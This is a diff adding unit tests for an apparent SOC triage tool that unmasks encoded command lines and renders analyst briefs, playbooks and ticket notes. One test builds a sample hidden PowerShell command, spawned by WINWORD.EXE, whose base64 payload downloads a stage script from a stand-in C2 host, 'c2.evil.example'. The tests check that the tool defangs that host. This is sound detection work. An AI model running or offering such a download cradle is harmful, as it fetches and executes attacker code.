@@ -6,6 +6,7 @@ import base64
 import unittest
 
 from cmd_unmask.models import PayloadNode, Severity, TriageVerdict, UnpackingDAG
+from cmd_unmask.renderer import build_soc_ticket_note, render_markdown, render_pretty
 from cmd_unmask.unpacker import unmask_command
 
 
@@ -79,6 +80,43 @@ class TestAttackChainCorrelator(unittest.TestCase):
         self.assertEqual(plain_verdict.severity, Severity.BENIGN)
         self.assertIn("benign", plain_verdict.executive_brief.lower())
         self.assertGreaterEqual(len(plain_verdict.playbook_steps), 1)
+
+
+class TestBriefAndPlaybookRenderer(unittest.TestCase):
+    """Verify [ANALYST EXECUTIVE BRIEF] and [RECOMMENDED L1/L2 NEXT STEPS] rendering."""
+
+    def test_malicious_multistage_renders_brief_and_playbook_in_pretty_markdown_and_note(self) -> None:
+        inner = "(New-Object Net.WebClient).DownloadString('http://c2.evil.example:8080/stage.ps1')"
+        b64 = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
+        verdict = unmask_command(
+            f"powershell.exe -NoP -W Hidden -enc {b64}",
+            source_id="ren-mal-1",
+            parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+        )
+        pretty = render_pretty([verdict], color=False)
+        md = render_markdown([verdict])
+        note = build_soc_ticket_note(verdict)
+
+        self.assertIn("[ANALYST EXECUTIVE BRIEF]", pretty)
+        self.assertIn("[RECOMMENDED L1/L2 NEXT STEPS]", pretty)
+        self.assertIn("WINWORD.EXE", pretty)
+        self.assertIn("c2[.]evil[.]example", pretty)
+
+        self.assertIn("Analyst Executive Brief", md)
+        self.assertIn("Recommended L1/L2 Next Steps", md)
+        self.assertIn("WINWORD.EXE", md)
+
+        self.assertIn("Exec Brief    :", note)
+        self.assertIn("Next Steps    :", note)
+        self.assertIn("c2[.]evil[.]example", note)
+
+    def test_benign_renders_clean_brief_and_playbook(self) -> None:
+        verdict = unmask_command("ipconfig /all", source_id="ren-ben-1")
+        pretty = render_pretty([verdict], color=False)
+        self.assertIn("[ANALYST EXECUTIVE BRIEF]", pretty)
+        self.assertIn("[RECOMMENDED L1/L2 NEXT STEPS]", pretty)
+        self.assertIn("Benign administrative", pretty)
 
 
 if __name__ == "__main__":
